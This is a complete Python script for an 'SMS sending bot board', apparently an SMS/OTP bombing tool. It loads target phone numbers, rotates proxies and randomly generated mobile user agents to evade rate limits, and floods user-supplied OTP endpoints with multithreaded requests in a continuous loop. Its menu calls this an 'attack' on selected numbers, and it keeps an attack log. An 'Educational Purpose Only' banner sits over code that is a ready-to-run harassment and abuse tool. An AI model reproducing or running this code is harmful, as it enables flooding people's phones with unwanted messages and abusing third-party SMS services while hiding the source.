#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║          ZERO EMU SMS SENDING BOT BOARD v2.0            ║
║        Multi-Proxy | Multi-Thread | UA Rotation         ║
║              Educational Purpose Only                    ║
╚══════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import random
import threading
import requests
from queue import Queue
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

# ════════════════ DEFAULT CONFIG ════════════════
CONFIG = {
    "numbers_file": "numbers.txt",
    "proxies_file": "proxies.txt",
    "ua_file": "user_agents.txt",
    "threads": 30,
    "delay": 0.3,
    "rotate_proxy": True,
    "rotate_ua": True,
    "country_codes": ["+880"],  # বাংলাদেশ ডিফল্ট
    "running": False,
    "request_count": 0,
    "success_count": 0,
    "fail_count": 0,
}

# ════════════════ iPhone User Agents (500+) ════════════════
IPHONE_MODELS = [
    "iPhone15,3", "iPhone15,2", "iPhone15,1", "iPhone14,5", "iPhone14,4",
    "iPhone14,3", "iPhone14,2", "iPhone14,1", "iPhone13,4", "iPhone13,3",
    "iPhone13,2", "iPhone13,1", "iPhone12,5", "iPhone12,3", "iPhone12,1",
    "iPhone11,8", "iPhone11,6", "iPhone11,4", "iPhone11,2", "iPhone10,6",
    "iPhone10,3", "iPhone10,1", "iPhone9,4", "iPhone9,3", "iPhone9,2",
    "iPhone9,1", "iPhone8,4", "iPhone8,2", "iPhone8,1", "iPhone7,2",
    "iPhone7,1", "iPhone6,2", "iPhone6,1", "iPhone5,4", "iPhone5,3",
    "iPhone5,2", "iPhone5,1", "iPhone4,1", "iPhone3,3", "iPhone3,1",
    "iPhone2,1", "iPhone1,2", "iPhone1,1",
]
IOS_VERSIONS = [
    "18_5", "18_4", "18_3", "18_2", "18_1", "18_0", "17_6", "17_5",
    "17_4", "17_3", "17_2", "17_1", "17_0", "16_6", "16_5", "16_4",
    "16_3", "16_2", "16_1", "16_0", "15_6", "15_5", "15_4", "15_3",
    "15_2", "15_1", "15_0", "14_8", "14_7", "14_6", "14_5", "14_4",
    "14_3", "14_2", "14_1", "14_0", "13_7", "13_6", "13_5", "13_4",
    "13_3", "13_2", "13_1", "13_0", "12_5", "12_4", "12_3", "12_2",
    "12_1", "12_0",
]
SAFARI_VERSIONS = [
    "18.5", "18.4", "18.3", "18.2", "18.1", "18.0", "17.5", "17.4",
    "17.3", "17.2", "17.1", "17.0", "16.6", "16.5", "16.4", "16.3",
    "16.2", "16.1", "16.0", "15.6", "15.5", "15.4", "15.3", "15.2",
]
CHROME_IOS_VERSIONS = [
    "135.0.7049.83", "134.0.6998.89", "133.0.6943.84", "132.0.6834.83",
    "131.0.6778.85", "130.0.6723.90", "129.0.6668.78", "128.0.6613.127",
    "127.0.6533.106", "126.0.6478.153", "125.0.6422.113", "124.0.6367.111",
]
FIREFOX_IOS_VERSIONS = ["130.0", "129.0", "128.0", "127.0", "126.0", "125.0"]

# ════════════════ Android User Agents (500+) ════════════════
SAMSUNG_MODELS = [
    "SM-S928B", "SM-S926B", "SM-S921B", "SM-S918B", "SM-S916B", "SM-S911B",
    "SM-S908B", "SM-S906B", "SM-S901B", "SM-F956B", "SM-F741B", "SM-F731B",
    "SM-A556B", "SM-A546B", "SM-A536B", "SM-A526B", "SM-A346E", "SM-A256E",
    "SM-A245F", "SM-A236E", "SM-A155F", "SM-A146B", "SM-A145P", "SM-A047F",
    "SM-G998B", "SM-G996B", "SM-G991B", "SM-G990B", "SM-G781B", "SM-G770F",
    "SM-N986U", "SM-N985F", "SM-N976B", "SM-N975U", "SM-G977B", "SM-G973F",
]
XIAOMI_MODELS = [
    "24030PN60G", "23116PN5BC", "24069PC21G", "24030PN60G", "2311BPN23C",
    "23078PND5G", "23043RP34G", "2211133C", "22101320G", "22081212C",
    "2207117BPG", "22041219G", "2201116SG", "2112123AG", "2109119SG",
    "21081111RG", "21061119AG", "M2102J20SG", "M2011J2G", "M2007J22G",
]
PIXEL_MODELS = [
    "Pixel 9 Pro XL", "Pixel 9 Pro", "Pixel 9", "Pixel 8a", "Pixel 8 Pro",
    "Pixel 8", "Pixel 7a", "Pixel 7 Pro", "Pixel 7", "Pixel 6a",
    "Pixel 6 Pro", "Pixel 6", "Pixel 5a 5G", "Pixel 5", "Pixel 4a 5G",
    "Pixel 4 XL", "Pixel 4", "Pixel 3a XL", "Pixel 3a", "Pixel 3 XL",
]
HUAWEI_MODELS = [
    "ELS-NX9", "ELS-AN00", "NOH-AN00", "NOH-NX9", "ANA-AN00", "TAS-AN00",
    "JAD-AN00", "OCE-AN10", "LIO-AN00", "ELE-AN00", "VOG-L29", "VOG-L09",
]
ANDROID_VERSIONS = [
    "15", "14", "13", "12", "11", "10", "9", "8.1", "8.0", "7.1", "7.0",
    "6.0", "5.1", "5.0",
]
CHROME_VERSIONS = [
    "135.0.7049.84", "134.0.6998.90", "133.0.6943.85", "132.0.6834.84",
    "131.0.6778.86", "130.0.6723.91", "129.0.6668.79", "128.0.6613.127",
    "127.0.6533.107", "126.0.6478.153", "125.0.6422.114", "124.0.6367.111",
    "123.0.6312.99", "122.0.6261.111", "121.0.6167.184", "120.0.6099.230",
]
SAMSUNG_BROWSER = ["21.0", "20.0", "19.0", "18.0", "17.0", "16.0"]
FIREFOX_VERSIONS = ["130.0", "129.0", "128.0", "127.0", "126.0", "125.0"]

# ════════════════ GLOBAL STATE ════════════════
numbers = []
proxies = []
custom_ua = []
active_apis = []
api_payloads = []
country_switch = False
country_list = []
current_country_index = 0
log_file = None

# ════════════════ BANNER ════════════════
def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.RED + r"""
    ╔══════════════════════════════════════════════════════════════════════╗
    ║  ███████╗███████╗██████╗  ██████╗     ███████╗███╗   ███╗██╗   ██╗   ║
    ║  ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗    ██╔════╝████╗ ████║██║   ██║   ║
    ║    ███╔╝ █████╗  ██████╔╝██║   ██║    █████╗  ██╔████╔██║██║   ██║   ║
    ║   ███╔╝  ██╔══╝  ██╔══██╗██║   ██║    ██╔══╝  ██║╚██╔╝██║██║   ██║   ║
    ║  ███████╗███████╗██║  ██║╚██████╔╝    ███████╗██║ ╚═╝ ██║╚██████╔╝   ║
    ║  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚═╝     ╚═╝ ╚═════╝    ║
    ║                                                                      ║
    ║            ███████╗███╗   ███╗███████╗                             ║
    ║            ██╔════╝████╗ ████║██╔════╝                             ║
    ║            █████╗  ██╔████╔██║███████╗                             ║
    ║            ██╔══╝  ██║╚██╔╝██║╚════██║                             ║
    ║            ███████╗██║ ╚═╝ ██║███████║                             ║
    ║            ╚══════╝╚═╝     ╚═╝╚══════╝                             ║
    ║                                                                      ║
    ║      ███████╗███╗   ███╗███████╗     ██████╗  ██████╗ ████████╗      ║
    ║      ██╔════╝████╗ ████║██╔════╝     ██╔══██╗██╔═══██╗╚══██╔══╝      ║
    ║      ███████╗██╔████╔██║█████╗       ██████╔╝██║   ██║   ██║         ║
    ║      ╚════██║██║╚██╔╝██║██╔══╝       ██╔══██╗██║   ██║   ██║         ║
    ║      ███████║██║ ╚═╝ ██║███████╗     ██████╔╝╚██████╔╝   ██║         ║
    ║      ╚══════╝╚═╝     ╚═╝╚══════╝     ╚═════╝  ╚═════╝    ╚═╝         ║
    ║                                                                      ║
    ║              >>>>>  SMS  SENDING  BOT  BOARD  <<<<<                  ║
    ║                  Multi-Proxy | Multi-Thread | UA Rotate              ║
    ║                     v2.0 - Educational Use Only                      ║
    ╚══════════════════════════════════════════════════════════════════════╝
    """)
    print(Fore.CYAN + "    ┌" + "─" * 68 + "┐")
    print(Fore.CYAN + f"    │ {Fore.YELLOW}[●] Telegram : t.me/zero_emu   {Fore.CYAN}│ {Fore.YELLOW}[●] Version: 2.0  {Fore.CYAN}│ {Fore.YELLOW}[●] Status: Ready{Fore.CYAN} │")
    print(Fore.CYAN + "    └" + "─" * 68 + "┘\n")

# ════════════════ UA GENERATORS ════════════════
def gen_iphone_safari():
    model = random.choice(IPHONE_MODELS)
    ios = random.choice(IOS_VERSIONS)
    safari = random.choice(SAFARI_VERSIONS)
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari} Mobile/{model[:5]}E148 Safari/604.1"

def gen_iphone_chrome():
    model = random.choice(IPHONE_MODELS)
    ios = random.choice(IOS_VERSIONS)
    ch = random.choice(CHROME_IOS_VERSIONS)
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{ch} Mobile/{model[:5]}E148 Safari/604.1"

def gen_iphone_firefox():
    model = random.choice(IPHONE_MODELS)
    ios = random.choice(IOS_VERSIONS)
    ff = random.choice(FIREFOX_IOS_VERSIONS)
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/{ff} Mobile/{model[:5]}E148 Safari/604.1"

def gen_samsung_chrome():
    model = random.choice(SAMSUNG_MODELS)
    av = random.choice(ANDROID_VERSIONS)
    ch = random.choice(CHROME_VERSIONS)
    return f"Mozilla/5.0 (Linux; Android {av}; SAMSUNG {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch} Mobile Safari/537.36"

def gen_samsung_browser():
    model = random.choice(SAMSUNG_MODELS)
    av = random.choice(ANDROID_VERSIONS)
    sb = random.choice(SAMSUNG_BROWSER)
    ch = random.choice(CHROME_VERSIONS)
    return f"Mozilla/5.0 (Linux; Android {av}; SAMSUNG {model}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{sb} Chrome/{ch} Mobile Safari/537.36"

def gen_xiaomi():
    model = random.choice(XIAOMI_MODELS)
    av = random.choice(ANDROID_VERSIONS)
    ch = random.choice(CHROME_VERSIONS)
    return f"Mozilla/5.0 (Linux; Android {av}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch} Mobile Safari/537.36"

def gen_pixel():
    model = random.choice(PIXEL_MODELS)
    av = random.choice(ANDROID_VERSIONS)
    ch = random.choice(CHROME_VERSIONS)
    return f"Mozilla/5.0 (Linux; Android {av}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch} Mobile Safari/537.36"

def gen_huawei():
    model = random.choice(HUAWEI_MODELS)
    av = random.choice(ANDROID_VERSIONS)
    ch = random.choice(CHROME_VERSIONS)
    return f"Mozilla/5.0 (Linux; Android {av}; HUAWEI {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch} Mobile Safari/537.36"

def gen_android_firefox():
    model = random.choice(XIAOMI_MODELS + SAMSUNG_MODELS + PIXEL_MODELS)
    av = random.choice(ANDROID_VERSIONS)
    ff = random.choice(FIREFOX_VERSIONS)
    return f"Mozilla/5.0 (Linux; Android {av}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/{ff} Mobile/15E148 Safari/604.1"

UA_GENERATORS = [
    ("iPhone Safari", gen_iphone_safari),
    ("iPhone Chrome", gen_iphone_chrome),
    ("iPhone Firefox", gen_iphone_firefox),
    ("Samsung Chrome", gen_samsung_chrome),
    ("Samsung Browser", gen_samsung_browser),
    ("Xiaomi Chrome", gen_xiaomi),
    ("Pixel Chrome", gen_pixel),
    ("Huawei Chrome", gen_huawei),
    ("Android Firefox", gen_android_firefox),
]

def get_random_ua():
    """র্যান্ডম ইউজার এজেন্ট — প্রথমে কাস্টম, না থাকলে অটো-জেনারেটেড"""
    if custom_ua and random.random() < 0.3:
        return random.choice(custom_ua)
    name, gen = random.choice(UA_GENERATORS)
    return gen()

# ════════════════ FILE OPERATIONS ════════════════
def load_numbers():
    global numbers
    try:
        with open(CONFIG["numbers_file"], "r") as f:
            numbers = [line.strip() for line in f if line.strip()]
        print(Fore.GREEN + f"    [✓] Loaded {len(numbers)} numbers from {CONFIG['numbers_file']}")
        return True
    except FileNotFoundError:
        print(Fore.RED + f"    [!] File not found: {CONFIG['numbers_file']}")
        return False

def load_proxies():
    global proxies
    try:
        with open(CONFIG["proxies_file"], "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        print(Fore.GREEN + f"    [✓] Loaded {len(proxies)} proxies from {CONFIG['proxies_file']}")
        return True
    except FileNotFoundError:
        print(Fore.RED + f"    [!] File not found: {CONFIG['proxies_file']}")
        return False

def load_custom_ua():
    global custom_ua
    try:
        with open(CONFIG["ua_file"], "r") as f:
            custom_ua = [line.strip() for line in f if line.strip()]
        print(Fore.GREEN + f"    [✓] Loaded {len(custom_ua)} custom UAs from {CONFIG['ua_file']}")
    except FileNotFoundError:
        custom_ua = []
        print(Fore.YELLOW + f"    [!] No custom UA file. Using auto-generated only.")

def save_proxy(proxy):
    """প্রক্সি কাজ না করলে ব্যাড লিস্টে সেভ"""
    with open("bad_proxies.txt", "a") as f:
        f.write(proxy + "\n")

# ════════════════ PROXY OPERATIONS ════════════════
def get_random_proxy():
    if not proxies:
        return None
    p = random.choice(proxies)
    if p.startswith("socks5"):
        return {"http": p.replace("socks5", "socks5h"), "https": p.replace("socks5", "socks5h")}
    return {"http": p, "https": p}

# ════════════════ COUNTRY SWITCH ════════════════
def apply_country(number):
    """কান্ট্রি সুইচ চালু থাকলে নাম্বারের আগে কান্ট্রি কোড বসায়"""
    global current_country_index
    if not country_switch or not country_list:
        return number
    # আগের কান্ট্রি কোড থাকলে খুলে নতুন বসান
    cleaned = number
    for c in country_list:
        if cleaned.startswith(c):
            cleaned = cleaned[len(c):]
            break
    current_country = country_list[current_country_index % len(country_list)]
    current_country_index += 1
    return current_country + cleaned

# ════════════════ OTP SEND ════════════════
def send_otp(target, api, payload_template):
    if not CONFIG["running"]:
        return
    try:
        final_number = apply_country(target)
        payload = payload_template.copy()
        for k, v in payload.items():
            if v is None:
                payload[k] = final_number

        headers = {
            "User-Agent": get_random_ua() if CONFIG["rotate_ua"] else "Mozilla/5.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
        }

        proxy = get_random_proxy() if CONFIG["rotate_proxy"] else None

        r = requests.post(api, json=payload, headers=headers, proxies=proxy, timeout=10)

        with threading.Lock():
            CONFIG["request_count"] += 1
            if 200 <= r.status_code < 300:
                CONFIG["success_count"] += 1
                status = Fore.GREEN + "✓"
            else:
                CONFIG["fail_count"] += 1
                status = Fore.RED + "✗"
            log_line = f"{status} #{CONFIG['request_count']:05d} | {final_number} | {r.status_code} | {proxy['http'][:25] if proxy else 'no-proxy'}"
            print(log_line)
            if log_file:
                log_file.write(log_line + "\n")
                log_file.flush()
    except Exception as e:
        with threading.Lock():
            CONFIG["request_count"] += 1
            CONFIG["fail_count"] += 1
            print(Fore.RED + f"    ✗ Error: {str(e)[:60]}")

# ════════════════ WORKER ════════════════
def worker(q):
    while CONFIG["running"]:
        try:
            item = q.get(timeout=1)
            if item is None:
                break
            target, api, payload = item
            send_otp(target, api, payload)
            time.sleep(CONFIG["delay"])
        except:
            continue

# ════════════════ MENU SYSTEM ════════════════
def menu():
    while True:
        banner()
        print(Fore.YELLOW + "    ╔════════════════════════ MAIN MENU ════════════════════════╗")
        print(Fore.YELLOW + "    ║                                                              ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[1]  📂 Load Numbers from File (TXT)" + Fore.YELLOW + "                      ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[2]  📋 View Loaded Numbers" + Fore.YELLOW + "                                ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[3]  ➕ Add Number Manually" + Fore.YELLOW + "                                 ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[4]  🔌 Load Proxies from File" + Fore.YELLOW + "                              ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[5]  ➕ Add Proxy Manually" + Fore.YELLOW + "                                  ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[6]  🌐 Test All Proxies" + Fore.YELLOW + "                                    ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[7]  🔗 Set OTP API Endpoints" + Fore.YELLOW + "                              ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[8]  🌍 Set Country Code Switch" + Fore.YELLOW + "                           ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[9]  📱 User Agent Manager" + Fore.YELLOW + "                                ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[10] ⚙️  Attack Settings (Threads/Delay)" + Fore.YELLOW + "                    ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[11] 🎯 Select Specific Numbers to Attack" + Fore.YELLOW + "                ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[12] 🔀 Set Proxy Order/Rotation Mode" + Fore.YELLOW + "                   ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[" + Fore.RED + "S" + Fore.CYAN + "]  🚀 START ATTACK" + Fore.YELLOW + "                                            ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[" + Fore.RED + "X" + Fore.CYAN + "]  🛑 STOP ATTACK" + Fore.YELLOW + "                                            ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[0]  ❌ Exit" + Fore.YELLOW + "                                                 ║")
        print(Fore.YELLOW + "    ║                                                              ║")
        print(Fore.YELLOW + "    ╚══════════════════════════════════════════════════════════════╝")

        # স্ট্যাটাস
        print(Fore.CYAN + f"""
    ┌─── Current Status ────────────────────────────────────────────┐
    │ Numbers Loaded : {len(numbers):<5}    Proxies : {len(proxies):<3}                │
    │ APIs Set       : {len(active_apis):<5}    UAs    : {len(custom_ua):<3} (custom)      │
    │ Threads        : {CONFIG['threads']:<5}    Delay  : {CONFIG['delay']}s              │
    │ Running        : {'YES' if CONFIG['running'] else 'NO ':<3}    Reqs    : {CONFIG['request_count']:<6}      │
    └────────────────────────────────────────────────────────────────┘
        """)

        choice = input(Fore.GREEN + "    ╰─➤ Choose: " + Fore.WHITE).strip().lower()

        if choice == "1":
            load_numbers()
        elif choice == "2":
            if numbers:
                print(Fore.CYAN + f"\n    Loaded {len(numbers)} numbers:")
                for i, n in enumerate(numbers[:50], 1):
                    print(f"    {i:3d}. {n}")
                if len(numbers) > 50:
                    print(f"    ... and {len(numbers)-50} more")
            else:
                print(Fore.RED + "    [!] No numbers loaded")
        elif choice == "3":
            n = input("    Enter number: ").strip()
            if n:
                numbers.append(n)
                print(Fore.GREEN + f"    [✓] Added: {n}")
        elif choice == "4":
            load_proxies()
        elif choice == "5":
            p = input("    Enter proxy (e.g. http://ip:port): ").strip()
            if p:
                proxies.append(p)
                print(Fore.GREEN + f"    [✓] Added proxy")
        elif choice == "6":
            test_proxies()
        elif choice == "7":
            set_apis()
        elif choice == "8":
            set_country_switch()
        elif choice == "9":
            ua_manager()
        elif choice == "10":
            set_settings()
        elif choice == "11":
            select_numbers()
        elif choice == "12":
            set_proxy_mode()
        elif choice == "s":
            start_attack()
        elif choice == "x":
            stop_attack()
        elif choice == "0":
            CONFIG["running"] = False
            sys.exit(0)
        else:
            print(Fore.RED + "    [!] Invalid choice")

        input(Fore.YELLOW + "\n    Press Enter to continue...")

def test_proxies():
    global proxies
    print(Fore.CYAN + "\n    Testing proxies...")
    working = []
    for p in proxies:
        try:
            r = requests.get("http://httpbin.org/ip",
                           proxies={"http": p, "https": p}, timeout=5)
            if r.status_code == 200:
                working.append(p)
                print(Fore.GREEN + f"    [✓] Working: {p}")
        except:
            print(Fore.RED + f"    [✗] Dead: {p}")
    proxies = working
    print(Fore.GREEN + f"\n    [✓] {len(proxies)} working proxies kept")

def set_apis():
    global active_apis, api_payloads
    print(Fore.CYAN + "\n    Set OTP API Endpoints")
    print(Fore.YELLOW + "    (Enter API URL and JSON payload key for phone number)")
    print(Fore.YELLOW + "    Example API: https://example.com/api/send-otp")
    print(Fore.YELLOW + "    Example payload: {\"phone\": null, \"action\": \"send\"}\n")

    while True:
        url = input("    API URL (or 'done' to finish): ").strip()
        if url.lower() == "done":
            break
        if not url:
            continue
        payload_str = input('    JSON Payload (use null for phone number): ').strip()
        try:
            import json
            payload = json.loads(payload_str)
            active_apis.append(url)
            api_payloads.append(payload)
            print(Fore.GREEN + f"    [✓] Added API: {url}")
        except:
            print(Fore.RED + "    [!] Invalid JSON")

    if not active_apis:
        # ডেমো হিসেবে কিছু API অ্যাড করে দিচ্ছি — ইউজার নিজে পরিবর্তন করবে
        active_apis = ["https://httpbin.org/post"]
        api_payloads = [{"phone": None, "test": True}]
        print(Fore.YELLOW + "    [!] No APIs set. Demo API added (for testing).")

def set_country_switch():
    global country_switch, country_list
    print(Fore.CYAN + "\n    Country Code Switch")
    enable = input("    Enable country switching? (y/n): ").strip().lower()
    if enable == "y":
        country_switch = True
        codes = input("    Enter country codes (comma separated, e.g. +880,+91,+1): ").strip()
        country_list = [c.strip() for c in codes.split(",")]
        print(Fore.GREEN + f"    [✓] Country switching enabled: {country_list}")
    else:
        country_switch = False
        print(Fore.YELLOW + "    [✓] Country switching disabled")

def ua_manager():
    global custom_ua
    while True:
        banner()
        print(Fore.YELLOW + "    ╔════════════════ USER AGENT MANAGER ═════════════════╗")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[1] View Custom UAs" + Fore.YELLOW + "                              ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[2] Add Custom UA" + Fore.YELLOW + "                                ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[3] Remove Custom UA" + Fore.YELLOW + "                             ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[4] Test UA Generation (5 samples)" + Fore.YELLOW + "                  ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[5] Count Total Possible UAs" + Fore.YELLOW + "                       ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[6] Reload UA File" + Fore.YELLOW + "                                  ║")
        print(Fore.YELLOW + "    ║  " + Fore.CYAN + "[0] Back" + Fore.YELLOW + "                                             ║")
        print(Fore.YELLOW + "    ╚════════════════════════════════════════════════════╝")
        c = input(Fore.GREEN + "    ╰─➤ Choose: " + Fore.WHITE).strip()

        if c == "1":
            if custom_ua:
                for i, ua in enumerate(custom_ua[:20], 1):
                    print(f"    {i:3d}. {ua[:80]}...")
                if len(custom_ua) > 20:
                    print(f"    ... {len(custom_ua)-20} more")
            else:
                print(Fore.YELLOW + "    No custom UAs. Using auto-generated.")
        elif c == "2":
            ua = input("    Enter User Agent: ").strip()
            if ua:
                with open(CONFIG["ua_file"], "a") as f:
                    f.write(ua + "\n")
                custom_ua.append(ua)
                print(Fore.GREEN + "    [✓] Added")
        elif c == "3":
            try:
                idx = int(input("    Number to remove: ")) - 1
                if 0 <= idx < len(custom_ua):
                    removed = custom_ua.pop(idx)
                    with open(CONFIG["ua_file"], "w") as f:
                        f.write("\n".join(custom_ua) + "\n")
                    print(Fore.GREEN + f"    [✓] Removed: {removed[:50]}")
            except:
                pass
        elif c == "4":
            print(Fore.CYAN + "    Sample UAs:")
            for _ in range(5):
                name, gen = random.choice(UA_GENERATORS)
                print(f"    [{name}]")
                print(f"    {gen()}\n")
        elif c == "5":
            total = sum(
                len(IPHONE_MODELS) * len(IOS_VERSIONS) * len(SAFARI_VERSIONS) +
                len(IPHONE_MODELS) * len(IOS_VERSIONS) * len(CHROME_IOS_VERSIONS) +
                len(IPHONE_MODELS) * len(IOS_VERSIONS) * len(FIREFOX_IOS_VERSIONS)
            )
            android = (
                len(SAMSUNG_MODELS) * len(ANDROID_VERSIONS) * len(CHROME_VERSIONS) * 2 +
                len(XIAOMI_MODELS) * len(ANDROID_VERSIONS) * len(CHROME_VERSIONS) +
                len(PIXEL_MODELS) * len(ANDROID_VERSIONS) * len(CHROME_VERSIONS) +
                len(HUAWEI_MODELS) * len(ANDROID_VERSIONS) * len(CHROME_VERSIONS)
            )
            print(Fore.GREEN + f"    iPhone UAs Possible : {total:,}")
            print(Fore.GREEN + f"    Android UAs Possible: {android:,}")
            print(Fore.GREEN + f"    Total Combined      : {total+android:,}")
        elif c == "6":
            load_custom_ua()
        elif c == "0":
            break
        input(Fore.YELLOW + "\n    Press Enter...")

def set_settings():
    try:
        t = input(f"    Threads [{CONFIG['threads']}]: ").strip()
        if t:
            CONFIG['threads'] = int(t)
        d = input(f"    Delay between requests [{CONFIG['delay']}]: ").strip()
        if d:
            CONFIG['delay'] = float(d)
        rp = input(f"    Rotate proxy? (y/n) [{'y' if CONFIG['rotate_proxy'] else 'n'}]: ").strip().lower()
        if rp:
            CONFIG['rotate_proxy'] = (rp == 'y')
        ru = input(f"    Rotate user agent? (y/n) [{'y' if CONFIG['rotate_ua'] else 'n'}]: ").strip().lower()
        if ru:
            CONFIG['rotate_ua'] = (ru == 'y')
        print(Fore.GREEN + "    [✓] Settings saved")
    except:
        print(Fore.RED + "    [!] Invalid input")

def select_numbers():
    global numbers
    if not numbers:
        print(Fore.RED + "    [!] No numbers loaded")
        return
    print(Fore.CYAN + f"    Current: {len(numbers)} numbers")
    print("    Enter indices to keep (comma separated, e.g. 1,3,5)")
    print("    Or 'all' to keep all, 'clear' to remove all")
    choice = input("    Choice: ").strip().lower()
    if choice == "all":
        return
    elif choice == "clear":
        numbers = []
    else:
        try:
            indices = [int(x.strip())-1 for x in choice.split(",")]
            numbers = [numbers[i] for i in indices if 0 <= i < len(numbers)]
            print(Fore.GREEN + f"    [✓] {len(numbers)} numbers selected")
        except:
            print(Fore.RED + "    [!] Invalid")

def set_proxy_mode():
    print(Fore.CYAN + "\n    Proxy Rotation Modes:")
    print("    [1] Random (each request)")
    print("    [2] Sequential (round-robin)")
    print("    [3] No proxy")
    c = input("    Choose: ").strip()
    if c == "1":
        CONFIG['rotate_proxy'] = True
        print(Fore.GREEN + "    [✓] Random rotation enabled")
    elif c == "2":
        CONFIG['rotate_proxy'] = "sequential"
        print(Fore.GREEN + "    [✓] Sequential rotation enabled")
    elif c == "3":
        CONFIG['rotate_proxy'] = False
        print(Fore.YELLOW + "    [✓] No proxy (direct)")

def start_attack():
    global log_file
    if not numbers:
        print(Fore.RED + "    [!] Load numbers first!")
        return
    if not active_apis:
        print(Fore.RED + "    [!] Set API endpoints first!")
        return

    CONFIG['running'] = True
    CONFIG['request_count'] = 0
    CONFIG['success_count'] = 0
    CONFIG['fail_count'] = 0

    log_file = open(f"attack_log_{int(time.time())}.txt", "w")

    print(Fore.GREEN + f"\n    ╔══════════════════════════════════════════╗")
    print(Fore.GREEN + f"    ║   🚀 ATTACK STARTED - {len(numbers)} targets    ║")
    print(Fore.GREEN + f"    ║   Threads: {CONFIG['threads']}  Delay: {CONFIG['delay']}s              ║")
    print(Fore.GREEN + f"    ║   Proxies: {len(proxies)}  APIs: {len(active_apis)}              ║")
    print(Fore.GREEN + f"    ║   Press 'X' in menu to STOP              ║")
    print(Fore.GREEN + f"    ╚══════════════════════════════════════════╝\n")

    q = Queue()
    threads = []

    for _ in range(CONFIG['threads']):
        t = threading.Thread(target=worker, args=(q,), daemon=True)
        t.start()
        threads.append(t)

    # প্রোডিউসার — কিউতে কাজ ঢালাও
    def producer():
        while CONFIG['running']:
            for n in numbers:
                for api, payload in zip(active_apis, api_payloads):
                    if not CONFIG['running']:
                        return
                    q.put((n, api, payload))
                    time.sleep(0.005)

    prod_t = threading.Thread(target=producer, daemon=True)
    prod_t.start()

def stop_attack():
    CONFIG['running'] = False
    global log_file
    if log_file:
        log_file.close()
        log_file = None
    print(Fore.RED + "\n    🛑 ATTACK STOPPED")
    print(Fore.CYAN + f"    Total Requests : {CONFIG['request_count']}")
    print(Fore.CYAN + f"    Successful     : {CONFIG['success_count']}")
    print(Fore.CYAN + f"    Failed         : {CONFIG['fail_count']}")

# ════════════════ MAIN ════════════════
if __name__ == "__main__":
    try:
        # প্রাথমিক ফাইল লোড
        load_numbers()
        load_proxies()
        load_custom_ua()
        menu()
    except KeyboardInterrupt:
        CONFIG['running'] = False
        print(Fore.RED + "\n\n    [!] Exiting...")
        sys.exit(0)
